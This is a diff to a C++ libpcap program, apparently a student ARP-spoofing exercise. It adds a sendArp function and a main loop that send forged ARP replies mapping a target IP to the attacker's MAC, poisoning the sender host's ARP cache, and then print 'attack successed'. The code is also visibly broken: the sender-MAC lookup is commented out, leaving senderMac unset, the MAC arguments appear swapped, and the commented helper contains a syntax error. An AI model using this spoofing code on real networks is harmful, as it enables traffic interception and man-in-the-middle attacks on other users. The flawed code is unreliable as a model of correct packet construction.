@@ -79,13 +79,44 @@ string getIpAddress(char* dev){
 	return (ip_address);
 }
 
+void sendArp(pcap_t* handle, Mac eth_dmac, Mac eth_smac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip, int mode){
+	//mode=1: reply, mode=0: request
+	packet.eth_.smac_ = eth_smac;
+	packet.eth_.dmac_ = eth_dmac;
+	packet.eth_.type_ = htons(EthHdr::Arp);
 
+	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+	packet.arp_.pro_ = htons(EthHdr::Ip4);
+	packet.arp_.hln_ = Mac::SIZE;
+	packet.arp_.pln_ = Ip::SIZE;
+	if (mode == 0)
+		packet.arp_.op_ = htons(ArpHdr::Request);
+	else if (mode == 1)
+		packet.arp_.op_ = htons(ArpHdr::Reply);
+	packet.arp_.smac_ = arp_smac;
+	packet.arp_.sip_ = htonl(arp_sip);
+	packet.arp_.tmac_ = arp_tmac;
+	packet.arp_.tip_ = htonl(arp_tip);
+
+	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+	if (res != 0){
+		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+	}
+	return;
+}
+
+/*
 //get Sender's Mac by Ip
 int GetSenderMac(pcap_t* handle, Ip myIp, Mac myMac, Ip senderIp, Mac* senderMac) {
 
-    return 0;
-}
+	//if fail to get sender mac address, return 1
+	Mac broadcast = Mac("FF:FF:FF:FF:FF:FF".);
+	Mac unknown = Mac("00:00:00:00:00:00");
 
+
+    return 0;//successed to get sender mac
+}
+*/
 
 int main(int argc, char* argv[]) {
 	if (argc < 4 || argc % 2){
@@ -98,19 +129,18 @@ int main(int argc, char* argv[]) {
 	string myIp;
 	myIp = getIpAddress(argv[1]);
 	getMacAddress(myMac, argv[1]);
-	cout<<"my Mac   Address : " << myMac;
-	cout<<"my IP    Address : " << myIp <<endl;
+	cout << "my Mac   Address : " << myMac;
+	cout << "my IP    Address : " << myIp << endl;
 
 	char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
+	
+	pcap_t* handle = pcap_open_live(dev,BUFSIZ, 1, 1, errbuf);
+	
 	if (handle == nullptr) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
 		return -1;
 	}
-
-	//Ip	myIp;
-	//Mac	myMac;
 
 	Mac	senderMac;
 	Ip	senderIp;
@@ -120,17 +150,24 @@ int main(int argc, char* argv[]) {
 	for (int i = 0; i < argc-2; i += 2){
 		senderIp = Ip(argv[2+i]);
 		targetIp = Ip(argv[2+i+1]);
-		
-		printf("sender Ip: %s\n", string(senderIp).c_str());
-		printf("target Ip: %s\n", string(targetIp).c_str());
-		/*senderMac = getSenderMac(handle, senderIp, myMac, myIp);
-		if (senderMac == 1) {
-			printf("can't find victim's Mac Address\n");
+
+		cout << "sender Ip: " << string(senderIp) << endl;
+		cout << "target Ip: " << string(targetIp) << endl;
+	
+		/*
+		int sender_mac_err = getSenderMac(handle, myIp, myMac, senderIp, &senderMac);
+		if (sender_mac_err) {
+			cout << "can't find sender's Mac Address" << endl;
 			pcap_close(handle);
 			return 0;
-		}
-		//targetMac = getSenderMac(handle, targetIp, myMac, myIp);
+		}*/
 
+
+		//sendArpPacket
+		sendArp(handle, myMac, senderMac, myMac, targetIp, senderMac, senderIp, 1);//mode: reply
+		printf("attack successed\n");
+		
+		/*
 		//sendArpPacket
 		packet.eth_.dmac = senderMac;
 		packet.eth_.smac = myMac;
@@ -146,16 +183,14 @@ int main(int argc, char* argv[]) {
 		packet.arp_.sip_ = htonl(targetIp);
 		packet.arp_.tmac_ = senderMac;
 		packet.arp_.tip_ = htonl(senderIp);
-*/
+
 
 		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 		
 		if (res != 0){
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 		}
-
-		printf("attack succeessed\n");
-	}
-	
+		*/
+	}	
 	pcap_close(handle);
 }
